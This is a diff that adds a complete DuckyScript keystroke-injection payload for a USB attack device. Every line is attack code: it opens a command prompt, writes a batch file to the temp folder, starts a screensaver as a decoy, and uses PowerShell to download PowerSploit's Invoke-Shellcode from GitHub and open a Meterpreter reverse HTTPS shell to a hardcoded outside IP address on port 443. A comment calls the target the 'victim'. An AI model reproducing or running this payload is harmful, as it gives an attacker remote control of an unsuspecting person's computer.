@@ -1,0 +1,23 @@
+DELAY 750
+GUI r
+DELAY 2000
+STRING cmd
+ENTER
+STRING cd %TEMP%
+ENTER
+STRING copy con met.cmd
+ENTER
+STRING start C:/Windows/System32/Ribbons.scr /s
+ENTER
+STRING powershell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tanc7/PowerSploit/master/CodeExecution/Invoke-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 52.53.180.45 -Lport 443 -Force"
+ENTER
+REM This following command is to ensure that the shellcode properly executes inside victim
+DELAY 2000
+STRING powershell Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost 52.53.180.45 -Lport 443 -Force
+ENTER
+DELAY 1000
+CTRL z
+ENTER
+DELAY 100
+STRING met.cmd && exit
+ENTER
